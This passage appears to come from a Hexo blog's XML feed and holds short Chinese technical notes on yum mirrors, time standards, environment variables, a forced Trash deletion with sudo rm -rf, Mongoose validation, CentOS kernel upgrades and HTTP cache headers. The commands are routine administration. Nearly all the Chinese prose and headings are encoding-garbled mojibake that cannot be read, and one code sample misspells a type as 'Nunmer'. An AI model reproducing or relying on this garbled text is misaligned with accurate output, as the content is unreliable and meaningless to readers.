class="line">1</span><br></pre></td><td class="code"><pre><span class="line">wget -O /etc/yum.repos.d/CentOS-Base.repo http://mirrors.aliyun.com/repo/Centos-6.repo</span><br></pre></td></tr></table></figure><p>CentOS 7</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">wget -O /etc/yum.repos.d/CentOS-Base.repo http://mirrors.aliyun.com/repo/Centos-7.repo</span><br></pre></td></tr></table></figure><p>3ã€ä¹‹åè¿è¡Œ yum makecache ç”Ÿæˆç¼“å­˜</p><h3 id="æ“ä½œç¡¬ä»¶å¹³å°"><a href="#æ“ä½œç¡¬ä»¶å¹³å°" class="headerlink" title="æ“ä½œç¡¬ä»¶å¹³å°"></a>æ“ä½œç¡¬ä»¶å¹³å°</h3><p><img src="/images/WX20200214-095055@2x.png" alt="æ“ä½œç¡¬ä»¶å¹³å°"></p><h3 id="å‚è€ƒ"><a href="#å‚è€ƒ" class="headerlink" title="å‚è€ƒ"></a>å‚è€ƒ</h3><ul><li><a href="http://linux.vbird.org/linux_basic/0520rpm_and_srpm.php#yumclient">ã€1ã€‘</a></li><li><a href="http://man.linuxde.net/yum">ã€2ã€‘</a></li><li><a href="http://cn.linux.vbird.org/linux_basic/0520rpm_and_srpm.php">è½¯ä»¶å®‰è£…ï¼š RPM, SRPM ä¸ YUM åŠŸèƒ½</a></li></ul>]]></content>
      
      
      
    </entry>
    
    
    
    <entry>
      <title>æ—¶é—´ç³»ç»Ÿ</title>
      <link href="/post/date-time.html"/>
      <url>/post/date-time.html</url>
      
        <content type="html"><![CDATA[<h2 id="æ—¶é—´ç³»ç»Ÿ"><a href="#æ—¶é—´ç³»ç»Ÿ" class="headerlink" title="æ—¶é—´ç³»ç»Ÿ"></a>æ—¶é—´ç³»ç»Ÿ</h2><h3 id="GMT"><a href="#GMT" class="headerlink" title="GMT"></a>GMT</h3><p>æ ¼æ—å¨æ²»æ ‡å‡†æ—¶é—´ã€‚æ ¼æ—å°¼æ²»å¹³æ—¶çš„æ­£åˆæ˜¯æŒ‡å½“å¹³å¤ªé˜³æ¨ªç©¿æ ¼æ—å¨æ²»å­åˆçº¿æ—¶ï¼ˆä¹Ÿå°±æ˜¯åœ¨æ ¼æ—å¨æ²»ä¸Šç©ºæœ€é«˜ç‚¹æ—¶ï¼‰çš„æ—¶é—´ã€‚ç”±äºåœ°çƒæ¯å¤©çš„è‡ªè½¬æ˜¯æœ‰äº›ä¸è§„åˆ™çš„ï¼Œè€Œä¸”æ­£åœ¨ç¼“æ…¢å‡é€Ÿï¼Œå› æ­¤æ ¼æ—å¨æ²»å¹³æ—¶åŸºäºå¤©æ–‡è§‚æµ‹æœ¬èº«çš„ç¼ºé™·ï¼Œå·²ç»è¢«åŸå­é’ŸæŠ¥æ—¶çš„åè°ƒä¸–ç•Œæ—¶ï¼ˆUTCï¼‰æ‰€å–ä»£ã€‚è‡ª1924å¹´2æœˆ5æ—¥å¼€å§‹ï¼Œæ ¼æ—å¨æ²»å¤©æ–‡å°è´Ÿè´£æ¯éš”ä¸€å°æ—¶å‘å…¨ä¸–ç•Œå‘æ”¾è°ƒæ—¶ä¿¡æ¯ã€‚</p><h3 id="UT"><a href="#UT" class="headerlink" title="UT"></a>UT</h3><p>ä¸–ç•Œæ—¶ã€‚ä¸–ç•Œæ—¶ï¼ˆUniversal Timeï¼Œç®€ç§°UTï¼‰æ˜¯ä¸€ç§ä»¥æ ¼æ—å°¼æ²»å­å¤œèµ·ç®—çš„å¹³å¤ªé˜³æ—¶ã€‚ä¸–ç•Œæ—¶æ˜¯ä»¥åœ°çƒè‡ªè½¬ä¸ºåŸºå‡†å¾—åˆ°çš„æ—¶é—´å°ºåº¦ï¼Œå…¶ç²¾åº¦å—åˆ°åœ°çƒè‡ªè½¬ä¸å‡åŒ€å˜åŒ–å’Œæç§»çš„å½±å“ï¼Œä¸ºäº†è§£å†³è¿™ç§å½±å“ï¼Œ1955å¹´å›½é™…å¤©æ–‡è”åˆä¼šå®šä¹‰äº†<strong>UT0</strong>ã€<strong>UT1</strong>å’Œ<strong>UT2</strong>ä¸‰ä¸ªç³»ç»Ÿï¼š</p><ul><li><p>UT0ç³»ç»Ÿæ˜¯ç”±ä¸€ä¸ªå¤©æ–‡å°çš„å¤©æ–‡è§‚æµ‹ç›´æ¥æµ‹å®šçš„ä¸–ç•Œæ—¶ï¼Œæ²¡æœ‰è€ƒè™‘æç§»é€ æˆçš„å¤©æ–‡å°åœ°ç†åæ ‡å˜åŒ–ã€‚è¯¥ç³»ç»Ÿæ›¾é•¿æœŸè¢«è®¤ä¸ºæ˜¯ç¨³å®šå‡åŒ€çš„æ—¶é—´è®¡é‡ç³»ç»Ÿï¼Œå¾—åˆ°è¿‡å¹¿æ³›åº”ç”¨ã€‚å®ƒåˆå«æ ¼æ—å°¼æ²»å¹³æ—¶(GMT)ã€‚</p></li><li><p>UT1ç³»ç»Ÿæ˜¯åœ¨UT0çš„åŸºç¡€ä¸ŠåŠ å…¥äº†æç§»æ”¹æ­£ Î”Î»ï¼Œä¿®æ­£åœ°è½´æ‘†åŠ¨çš„å½±å“ã€‚UT1æ˜¯ç›®å‰ä½¿ç”¨çš„ä¸–ç•Œæ—¶æ ‡å‡†ã€‚è¢«ä½œä¸ºç›®å‰ä¸–ç•Œæ°‘ç”¨æ—¶é—´æ ‡å‡†UTCåœ¨å¢å‡é—°ç§’æ—¶çš„å‚ç…§æ ‡å‡†ã€‚</p></li><li><p>UT2ç³»ç»Ÿæ˜¯UT1çš„å¹³æ»‘å¤„ç†ç‰ˆæœ¬ï¼Œåœ¨UT1åŸºç¡€ä¸ŠåŠ å…¥äº†åœ°çƒè‡ªè½¬é€Ÿç‡çš„å­£èŠ‚æ€§æ”¹æ­£ Î”Tã€‚</p></li></ul><h3 id="UTC"><a href="#UTC" class="headerlink" title="UTC"></a>UTC</h3><p>åè°ƒä¸–ç•Œæ—¶ã€‚UTCåŸºäºå›½é™…åŸå­æ—¶ï¼Œå¹¶é€šè¿‡ä¸è§„åˆ™çš„åŠ å…¥é—°ç§’æ¥æŠµæ¶ˆåœ°çƒè‡ªè½¬å˜æ…¢çš„å½±å“ã€‚é—°ç§’åœ¨å¿…è¦çš„æ—¶å€™ä¼šè¢«æ’å…¥åˆ°UTCä¸­ï¼Œä»¥ä¿è¯åè°ƒä¸–ç•Œæ—¶ï¼ˆUTCï¼‰ä¸ä¸–ç•Œæ—¶ï¼ˆUT1ï¼‰ç›¸å·®ä¸è¶…è¿‡0.9ç§’ã€‚UTCè¢«åº”ç”¨äºè®¸å¤šäº’è”ç½‘å’Œä¸‡ç»´ç½‘çš„æ ‡å‡†ä¸­ï¼Œä¾‹å¦‚ï¼Œç½‘ç»œæ—¶é—´åè®®ï¼ˆNTP, Network Time Protocolï¼‰å°±æ˜¯åè°ƒä¸–ç•Œæ—¶åœ¨äº’è”ç½‘ä¸­ä½¿ç”¨çš„ä¸€ç§æ–¹å¼ã€‚</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">new</span> <span class="title class_">Date</span>(<span class="string">&#x27;2018-07-17T22:58:23Z&#x27;</span>);</span><br><span class="line"></span><br><span class="line"><span class="keyword">new</span> <span class="title class_">Date</span>(<span class="string">&#x27;2018-07-17T22:58:23+0800&#x27;</span>);</span><br></pre></td></tr></table></figure><p>ä¸Šä¾‹ä¸­ç¬¬ä¸€ä¸ªæ—¶é—´è¡¨ç¤ºUTCæ—¶é—´ï¼Œç¬¬äºŒä¸ªè¡¨ç¤ºåŒ—äº¬æ—¶é—´ã€‚ç¬¬äºŒä¸ªæ—¶é—´æ¯”ç¬¬ä¸€ä¸ªæ—©äº†å…«ä¸ªå°æ—¶ã€‚</p><h3 id="CST"><a href="#CST" class="headerlink" title="CST"></a>CST</h3><p><strong>C</strong>hina <strong>S</strong>tandard <strong>T</strong>ime ä¸­å›½æ ‡å‡†æ—¶é—´ï¼Œæ˜¯ä¸­å›½å¤§é™†çš„æ ‡å‡†æ—¶é—´ï¼Œæ¯”ä¸–ç•Œåè°ƒæ—¶å¿«å…«å°æ—¶ï¼ˆå³UTC+8ï¼‰ã€‚</p><blockquote><p>æ³¨æ„CSTè¿˜æœ‰å…¶å®ƒå«ä¹‰ï¼š</p><ul><li>æ¾³æ´²ä¸­éƒ¨æ—¶é—´ï¼ŒCentral Standard Time (Australia)</li><li>åŒ—ç¾ä¸­éƒ¨æ—¶åŒºï¼ŒCentral Standard Time (North America)</li><li>å¤å·´æ ‡å‡†æ—¶é—´ï¼ŒCuba Standard Timeï¼Œå‚è§åŒ—ç¾ä¸œéƒ¨æ—¶åŒº</li></ul></blockquote><h3 id="å‚è€ƒ"><a href="#å‚è€ƒ" class="headerlink" title="å‚è€ƒ"></a>å‚è€ƒ</h3><ul><li><a href="http://www.ecma-international.org/ecma-262/5.1/#sec-15.9.1.15">Date Time String Format</a></li><li><a href="https://www.wikiwand.com/zh/%E5%8D%8F%E8%B0%83%E4%B8%96%E7%95%8C%E6%97%B6">åè°ƒä¸–ç•Œæ—¶</a></li></ul>]]></content>
      
      
      
        <tags>
            
            <tag> date </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>ç¯å¢ƒå˜é‡</title>
      <link href="/post/environment-variable.html"/>
      <url>/post/environment-variable.html</url>
      
        <content type="html"><![CDATA[<h3 id="è®¾ç½®ç¯å¢ƒå˜é‡"><a href="#è®¾ç½®ç¯å¢ƒå˜é‡" class="headerlink" title="è®¾ç½®ç¯å¢ƒå˜é‡"></a>è®¾ç½®ç¯å¢ƒå˜é‡</h3><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">export name=value</span><br></pre></td></tr></table></figure><h3 id="æŸ¥çœ‹è¿›ç¨‹ç¯å¢ƒå˜é‡"><a href="#æŸ¥çœ‹è¿›ç¨‹ç¯å¢ƒå˜é‡" class="headerlink" title="æŸ¥çœ‹è¿›ç¨‹ç¯å¢ƒå˜é‡"></a>æŸ¥çœ‹è¿›ç¨‹ç¯å¢ƒå˜é‡</h3><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta prompt_"># </span><span class="language-bash">æŸ¥çœ‹æŸä¸ªè¿›ç¨‹çš„ç¯å¢ƒå˜é‡</span></span><br><span class="line">cat /proc/$PID/environ</span><br></pre></td></tr></table></figure><p>æ¯ä¸€ä¸ªç¯å¢ƒå˜é‡ä»¥name&#x3D;valueå½¢å¼æ¥æè¿°ï¼Œå½¼æ­¤é—´æœ‰nullå­—ç¬¦(\0)åˆ†å‰²ã€‚</p><p>å°†\0æ›¿æ¢æˆ\nè¾“å‡º</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta prompt_"># </span><span class="language-bash">æŸ¥çœ‹æŸä¸ªè¿›ç¨‹çš„ç¯å¢ƒå˜é‡</span></span><br><span class="line">cat /proc/$PID/environ | tr &#x27;\0&#x27; &#x27;\n&#x27;</span><br></pre></td></tr></table></figure>]]></content>
      
      
      
    </entry>
    
    
    
    <entry>
      <title>Linuxé”™è¯¯é‡å®šå‘</title>
      <link href="/post/linux-redirect-standard-error.html"/>
      <url>/post/linux-redirect-standard-error.html</url>
      
        <content type="html"><![CDATA[<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">svn cleanup /Users/doog/Documents/Workspaces/work/innovation &gt;&gt; /Users/doog/log 2&gt;&amp;1</span><br></pre></td></tr></table></figure>]]></content>
      
      
      
    </entry>
    
    
    
    <entry>
      <title>Macä¸èƒ½æ¸…ç©ºåºŸçº¸ç¯“</title>
      <link href="/post/macos-clean-trash.html"/>
      <url>/post/macos-clean-trash.html</url>
      
        <content type="html"><![CDATA[<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sudo rm -rf ~/.Trash/</span><br></pre></td></tr></table></figure>]]></content>
      
      
      
    </entry>
    
    
    
    <entry>
      <title>mongoose-validation</title>
      <link href="/post/mongoose-validation.html"/>
      <url>/post/mongoose-validation.html</url>
      
        <content type="html"><![CDATA[<p><a href="http://mongoosejs.com/docs/validation.html">http://mongoosejs.com/docs/validation.html</a></p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">var</span> schema = <span class="keyword">new</span> <span class="title class_">Schema</span>(&#123;</span><br><span class="line">  <span class="attr">name</span>: &#123;</span><br><span class="line">    <span class="attr">type</span>: <span class="title class_">String</span>,</span><br><span class="line">    <span class="attr">required</span>: <span class="literal">true</span></span><br><span class="line">  &#125;</span><br><span class="line">&#125;);</span><br><span class="line"><span class="keyword">var</span> <span class="title class_">Cat</span> = db.<span class="title function_">model</span>(<span class="string">&#x27;Cat&#x27;</span>, schema);</span><br><span class="line"></span><br><span class="line"><span class="comment">// This cat has no name :(</span></span><br><span class="line"><span class="keyword">var</span> cat = <span class="keyword">new</span> <span class="title class_">Cat</span>();</span><br><span class="line">cat.<span class="title function_">save</span>(<span class="keyword">function</span>(<span class="params">error</span>) &#123;</span><br><span class="line">  assert.<span class="title function_">equal</span>(error.<span class="property">errors</span>[<span class="string">&#x27;name&#x27;</span>].<span class="property">message</span>,</span><br><span class="line">    <span class="string">&#x27;Path `name` is required.&#x27;</span>);</span><br><span class="line"></span><br><span class="line">  error = cat.<span class="title function_">validateSync</span>();</span><br><span class="line">  assert.<span class="title function_">equal</span>(error.<span class="property">errors</span>[<span class="string">&#x27;name&#x27;</span>].<span class="property">message</span>,</span><br><span class="line">    <span class="string">&#x27;Path `name` is required.&#x27;</span>);</span><br><span class="line">&#125;);</span><br></pre></td></tr></table></figure><p><a href="http://cnodejs.org/topic/504b4924e2b84515770103dd">http://cnodejs.org/topic/504b4924e2b84515770103dd</a></p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">var</span> <span class="title class_">PersonSchema</span> = <span class="keyword">new</span> <span class="title class_">Schema</span>(&#123;</span><br><span class="line">  <span class="attr">name</span>:&#123;</span><br><span class="line">    <span class="attr">type</span>:<span class="string">&#x27;String&#x27;</span>,</span><br><span class="line">    <span class="attr">required</span>:<span class="literal">true</span> <span class="comment">//å§“åéç©º</span></span><br><span class="line">  &#125;,</span><br><span class="line">  <span class="attr">age</span>:&#123;</span><br><span class="line">    <span class="attr">type</span>:<span class="string">&#x27;Nunmer&#x27;</span>,</span><br><span class="line">    <span class="attr">min</span>:<span class="number">18</span>,       <span class="comment">//å¹´é¾„æœ€å°18</span></span><br><span class="line">    <span class="attr">max</span>:<span class="number">120</span>     <span class="comment">//å¹´é¾„æœ€å¤§120</span></span><br><span class="line">  &#125;,</span><br><span class="line">  <span class="attr">city</span>:&#123;</span><br><span class="line">    <span class="attr">type</span>:<span class="string">&#x27;String&#x27;</span>,</span><br><span class="line">    <span class="attr">enum</span>:[<span class="string">&#x27;åŒ—äº¬&#x27;</span>,<span class="string">&#x27;ä¸Šæµ·&#x27;</span>]  <span class="comment">//åªèƒ½æ˜¯åŒ—äº¬ã€ä¸Šæµ·äºº</span></span><br><span class="line">  &#125;,</span><br><span class="line">  <span class="attr">other</span>:&#123;</span><br><span class="line">    <span class="attr">type</span>:<span class="string">&#x27;String&#x27;</span>,</span><br><span class="line">    <span class="attr">validate</span>:[validator,err]  <span class="comment">//validatoræ˜¯ä¸€ä¸ªéªŒè¯å‡½æ•°ï¼Œerræ˜¯éªŒè¯å¤±è´¥çš„é”™è¯¯ä¿¡æ¯</span></span><br><span class="line">  &#125;</span><br><span class="line">&#125;);</span><br></pre></td></tr></table></figure>]]></content>
      
      
      
    </entry>
    
    
    
    <entry>
      <title>Linuxå†…æ ¸</title>
      <link href="/post/linux-kernel.html"/>
      <url>/post/linux-kernel.html</url>
      
        <content type="html"><![CDATA[<h2 id="Linuxå†…æ ¸"><a href="#Linuxå†…æ ¸" class="headerlink" title="Linuxå†…æ ¸"></a>Linuxå†…æ ¸</h2><h3 id="æŸ¥çœ‹å†…æ ¸åŠå‘è¡Œç‰ˆ"><a href="#æŸ¥çœ‹å†…æ ¸åŠå‘è¡Œç‰ˆ" class="headerlink" title="æŸ¥çœ‹å†…æ ¸åŠå‘è¡Œç‰ˆ"></a>æŸ¥çœ‹å†…æ ¸åŠå‘è¡Œç‰ˆ</h3><ol><li><code>uname -a</code>ï¼šæŸ¥çœ‹Linuxå†…æ ¸ç‰ˆæœ¬</li><li><code>cat /etc/issue</code>ï¼šæŸ¥çœ‹å‘è¡Œç‰ˆ</li><li><code>cat /proc/version</code></li></ol><h3 id="å‡çº§CentOS6å†…æ ¸"><a href="#å‡çº§CentOS6å†…æ ¸" class="headerlink" title="å‡çº§CentOS6å†…æ ¸"></a>å‡çº§CentOS6å†…æ ¸</h3><ol><li><p>å¯¼å…¥public key</p> <figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">rpm --import https://www.elrepo.org/RPM-GPG-KEY-elrepo.org</span><br></pre></td></tr></table></figure></li><li><p>æ·»åŠ ELRepo</p><ul><li>RHEL-7, SL-7 or CentOS-7ï¼š  <figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">rpm -Uvh http://www.elrepo.org/elrepo-release-7.0-3.el7.elrepo.noarch.rpm</span><br></pre></td></tr></table></figure></li><li>RHEL-6, SL-6 or CentOS-6ï¼š <figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">rpm -Uvh http://www.elrepo.org/elrepo-release-6-8.el6.elrepo.noarch.rpm</span><br></pre></td></tr></table></figure></li></ul></li><li><p>å‡çº§Kernel</p><blockquote><p>åœ¨ ELRepo ä¸­æœ‰ä¸¤ä¸ªå†…æ ¸é€‰é¡¹ï¼Œä¸€ä¸ªæ˜¯ kernel-lt(é•¿æœŸæ”¯æŒç‰ˆæœ¬)ï¼Œä¸€ä¸ªæ˜¯ kernel-ml(ä¸»çº¿æœ€æ–°ç‰ˆæœ¬)ï¼Œé‡‡ç”¨é•¿æœŸæ”¯æŒç‰ˆæœ¬(kernel-lt)ã€‚</p> <figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"># kernel-lt</span><br><span class="line">yum --enablerepo=elrepo-kernel install kernel-lt -y </span><br><span class="line">or</span><br><span class="line"># kernel-ml</span><br><span class="line">yum --enablerepo=elrepo-kernel install kernel-ml -y </span><br></pre></td></tr></table></figure></blockquote></li><li><p>å®‰è£…å®Œæˆï¼Œéœ€è¦ä¿®æ”¹grub</p><blockquote><p>æ ¹æ®å®‰è£…å¥½ä»¥åçš„å†…æ ¸ä½ç½®ï¼Œä¿®æ”¹ default çš„å€¼ï¼Œä¸€èˆ¬æ˜¯ä¿®æ”¹ä¸º0ï¼Œå› ä¸º default ä» 0 å¼€å§‹ï¼Œä¸€èˆ¬æ–°å®‰è£…çš„å†…æ ¸åœ¨ç¬¬ä¸€ä¸ªä½ç½®ï¼Œæ‰€ä»¥è®¾ç½®default&#x3D;0ã€‚</p></blockquote><ul><li>RHEL-7, SL-7 or CentOS-7ï¼š</li></ul> <figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">vim /etc/default/grub</span><br><span class="line"></span><br><span class="line"># é‡æ–°ç¼–è¯‘å†…æ ¸å¯åŠ¨æ–‡ä»¶</span><br><span class="line">grub2-mkconfig -o /boot/grub2/grub.cfg</span><br></pre></td></tr></table></figure><ul><li>RHEL-6, SL-6 or CentOS-6ï¼š</li></ul> <figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">vim /etc/grub.conf</span><br></pre></td></tr></table></figure></li><li><p>åˆ é™¤æ—§å†…æ ¸</p> <figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">rpm -qa | grep kernel</span><br><span class="line">yum autoremove kernel-2.6.32-696.el6.x86_64</span><br></pre></td></tr></table></figure></li><li><p>é‡å¯æœåŠ¡å™¨</p> <figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">reboot </span><br></pre></td></tr></table></figure></li></ol><h3 id="å‚è€ƒ"><a href="#å‚è€ƒ" class="headerlink" title="å‚è€ƒ"></a>å‚è€ƒ</h3><ul><li><a href="https://blog.csdn.net/wh211212/article/details/78683753">CentOS6.X å‡çº§å†…æ ¸Kernel</a></li><li><a href="http://elrepo.org/tiki/tiki-index.php">ELRepo.org</a></li><li><a href="https://www.centos.bz/2017/08/upgrade-centos-7-6-kernel-to-4-12-4/">å‡çº§Centos 7&#x2F;6å†…æ ¸ç‰ˆæœ¬åˆ°4.12.4çš„æ–¹æ³•</a></li></ul>]]></content>
      
      
      <categories>
          
          <category> linux </category>
          
      </categories>
      
      
        <tags>
            
            <tag> kernel </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>HTTPç¼“å­˜.md</title>
      <link href="/post/http-cache.html"/>
      <url>/post/http-cache.html</url>
      
        <content type="html"><![CDATA[<h3 id="Http-Cache"><a href="#Http-Cache" class="headerlink" title="Http Cache"></a>Http Cache</h3><p>httpç¼“å­˜ä¸»è¦æœ‰ä¸¤ä¸ªåœ°æ–¹ï¼Œæµè§ˆå™¨å’Œç¼“å­˜æœåŠ¡å™¨ã€‚<br><img src="/images/QQ20160906-0@2x.jpg"></p><table><thead><tr><th>å‚æ•°</th><th>å«ä¹‰</th></tr></thead><tbody><tr><td>Age</td><td>Age èƒ½å‘ŠçŸ¥å®¢æˆ·ç«¯,æºæœåŠ¡å™¨åœ¨å¤šä¹…å‰åˆ›å»ºäº†å“åº”ã€‚å­—æ®µ å€¼çš„å•ä½ä¸ºç§’ã€‚è¡¨ç¤ºç¼“å­˜æœåŠ¡å™¨æ‹¿ç¼“å­˜äº†å¤šä¹…ã€‚</td></tr><tr><td>Date</td><td>Date è¡¨æ˜åˆ›å»º HTTP æŠ¥æ–‡çš„æ—¥æœŸå’Œæ—¶é—´ã€‚</td></tr><tr><td>Cache-Control:max-age</td><td>å®šä¹‰äº†æ–‡æ¡£çš„æœ€å¤§ä½¿ç”¨æœŸâ€”â€”ä»ç¬¬ä¸€æ¬¡ç”Ÿæˆæ–‡æ¡£åˆ°æ–‡æ¡£ä¸å†æ–°é²œã€æ— æ³•ä½¿ç”¨ä¸ºæ­¢,æœ€å¤§çš„åˆæ³•ç”Ÿå­˜æ—¶é—´(ä»¥ç§’ä¸ºå•ä½) Cache-Control: max-age&#x3D;484200</td></tr><tr><td>Expires</td><td>æŒ‡å®šä¸€ä¸ªç»å¯¹çš„è¿‡æœŸæ—¥æœŸã€‚å¦‚æœè¿‡æœŸæ—¥æœŸå·²ç»è¿‡äº†,å°±è¯´æ˜æ–‡æ¡£ä¸å†æ–°é²œäº† Expires: Fri, 05 Jul 2002, 05:00:00 GMTã€‚å¦‚æœæ˜¯ç¼“å­˜æœåŠ¡å™¨ï¼Œç¼“å­˜æœåŠ¡å™¨åœ¨è¿™æ®µæ—¶é—´å†…ä¸ä¼šå†å»è¯·æ±‚æºæœåŠ¡å™¨ã€‚Expiresæ˜¯HTTP&#x2F;1.0çš„å†™æ³•ï¼ŒHTTP&#x2F;1.1ä½¿ç”¨Cache-Control:max-ageã€‚</td></tr><tr><td>Pragma</td><td>Pragma æ˜¯ HTTP&#x2F;1.1 ä¹‹å‰ç‰ˆæœ¬çš„å†å²é—ç•™å­—æ®µã€‚ Cache-Control: no-cacheå’Œ  Pragma: no-cacheå«ä¹‰ä¸€æ ·ã€‚</td></tr><tr><td>Last-Modified</td><td>èµ„æºçš„æœ€æ–°ä¿®æ”¹æ—¶é—´ï¼Œå’ŒIf-Modified-Sinceæ˜¯ä¸€å¯¹ã€‚</td></tr><tr><td>If-Modified-Since:date</td><td>å®¢æˆ·ç«¯å†æ¬¡å‘é€è¯·æ±‚æ—¶ä¼šå¸¦ä¸Šå“åº”æ—¶Last-Modifiedçš„å€¼ï¼ŒæœåŠ¡ç«¯ä¼šæ ¹æ®æ—¥æœŸå»æ¯”å¯¹èµ„æºæ˜¯å¦æ˜¯æ—§çš„ã€‚</td></tr><tr><td>ETag</td><td>å®ƒæ˜¯ä¸€ç§å¯å°†èµ„æºä»¥å­—ç¬¦ä¸²å½¢å¼åšå”¯ä¸€æ€§æ ‡è¯†çš„æ–¹å¼ã€‚æœåŠ¡å™¨ä¼šä¸ºæ¯ä»½èµ„æºåˆ†é…å¯¹åº”çš„ ETag å€¼ã€‚å®¢æˆ·ç«¯å†å‘è¯·æ±‚æ—¶ä¼šåœ¨If-None-Matchå¸¦ä¸ŠETagçš„å€¼ï¼ŒæœåŠ¡å™¨ç«¯å›å»æ¯”å¯¹æ˜¯å¦ä¸€è‡´ï¼Œå¦‚æœä¸€è‡´åˆ™å“åº”304ï¼Œä¸å†å‘é€å“åº”ä½“ã€‚</td></tr><tr><td>If-None-Match:tags</td><td>å’ŒEtagæ˜¯ä¸€å¯¹</td></tr></tbody></table><h3 id="å¤‡æ³¨"><a href="#å¤‡æ³¨" class="headerlink" title="å¤‡æ³¨"></a>å¤‡æ³¨</h3><blockquote><p>Expires é¦–éƒ¨å’Œ Cache-Control: max-age é¦–éƒ¨æ‰€åšçš„äº‹æƒ…æœ¬è´¨ä¸Šæ˜¯ä¸€æ ·çš„,ä½†ç”±äº Cache-Control é¦–éƒ¨ä½¿ç”¨çš„æ˜¯ç›¸å¯¹æ—¶é—´è€Œä¸æ˜¯ç»å¯¹æ—¥æœŸ,æ‰€ä»¥æˆ‘ä»¬æ›´å€¾å‘äºä½¿ç”¨æ¯”è¾ƒæ–°çš„ Cache-Control é¦–éƒ¨ã€‚ç»å¯¹æ—¥æœŸä¾èµ–äºè®¡ç®—æœºæ—¶é’Ÿçš„æ­£ç¡®è®¾ç½®ã€‚</p></blockquote><hr><blockquote><p>ä»…ä»…æ˜¯å·²ç¼“å­˜æ–‡æ¡£è¿‡æœŸäº†å¹¶ä¸æ„å‘³ç€å®ƒå’ŒåŸå§‹æœåŠ¡å™¨ä¸Šç›®å‰å¤„äºæ´»è·ƒçŠ¶æ€çš„æ–‡æ¡£æœ‰å®é™…çš„åŒºåˆ«;è¿™åªæ˜¯æ„å‘³ç€åˆ°äº†è¦è¿›è¡Œæ ¸å¯¹çš„æ—¶é—´äº†ã€‚è¿™ç§æƒ…å†µè¢«ç§°ä¸ºâ€œæœåŠ¡å™¨å† éªŒè¯â€,è¯´æ˜ç¼“å­˜éœ€è¦è¯¢é—®åŸå§‹æœåŠ¡å™¨æ–‡æ¡£æ˜¯å¦å‘ç”Ÿäº†å˜åŒ–ã€‚</p><ul><li>å¦‚æœå†éªŒè¯æ˜¾ç¤ºå†…å®¹å‘ç”Ÿäº†å˜åŒ–,ç¼“å­˜ä¼šè·å–ä¸€ä»½æ–°çš„æ–‡æ¡£å‰¯æœ¬,å¹¶å°†å…¶å­˜å‚¨åœ¨æ—§æ–‡æ¡£çš„ä½ç½®ä¸Š,ç„¶åå°†æ–‡æ¡£å‘é€ç»™å®¢æˆ·ç«¯ã€‚</li><li>å¦‚æœå†éªŒè¯æ˜¾ç¤ºå†…å®¹æ²¡æœ‰å‘ç”Ÿå˜åŒ–,ç¼“å­˜åªéœ€è¦è·å–æ–°çš„é¦–éƒ¨,åŒ…æ‹¬ä¸€ä¸ªæ–°çš„è¿‡æœŸæ—¥æœŸ,å¹¶å¯¹ç¼“å­˜ä¸­çš„é¦–éƒ¨è¿›è¡Œæ›´æ–°å°±è¡Œäº†ã€‚</li></ul></blockquote><hr><blockquote><p>If-Modified-Since é¦–éƒ¨å¯ä»¥ä¸ Last-Modified æœåŠ¡å™¨å“åº”é¦–éƒ¨é…åˆå·¥ä½œã€‚åŸå§‹ æœåŠ¡å™¨ä¼šå°†æœ€åçš„ä¿®æ”¹æ—¥æœŸé™„åŠ åˆ°æ‰€æä¾›çš„æ–‡æ¡£ä¸Šå»ã€‚å½“ç¼“å­˜è¦å¯¹å·²ç¼“å­˜æ–‡æ¡£è¿›è¡Œ å†éªŒè¯æ—¶,å°±ä¼šåŒ…å«ä¸€ä¸ª If-Modified-Since 